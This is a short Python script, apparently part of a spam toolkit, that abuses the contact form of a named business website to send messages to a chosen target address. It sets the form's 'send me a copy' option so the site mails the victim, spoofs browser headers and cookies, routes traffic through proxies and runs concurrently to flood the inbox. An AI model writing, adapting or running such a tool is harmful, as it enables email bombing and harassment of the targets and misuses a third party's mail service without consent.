from os.path import basename

import requests

from module import Spam

cookies = {
    'resolution': '1920,1',
    '_ga': 'GA1.3.189048780.1677145459',
    '_gid': 'GA1.3.109481244.1677145459',
    '_gat': '1',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'resolution=1920,1; _ga=GA1.3.189048780.1677145459; _gid=GA1.3.109481244.1677145459; _gat=1',
    'Origin': 'http://www.bullpen.com.au',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://www.bullpen.com.au/contact-us/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        data = {
            'zn_form_field_your_name1_0': text,
            'zn_form_field_email1_1': target,
            'zn_form_field_subject1_2': text,
            'zn_form_field_message1_3': text,
            'zn_pb_form_submit_1': '1',
            'send_me_copy_eluid5b15545a': 'true',
        }

        response = requests.post('http://www.bullpen.com.au/contact-us/', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())

        return response


def main():
    s = 'Thank'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
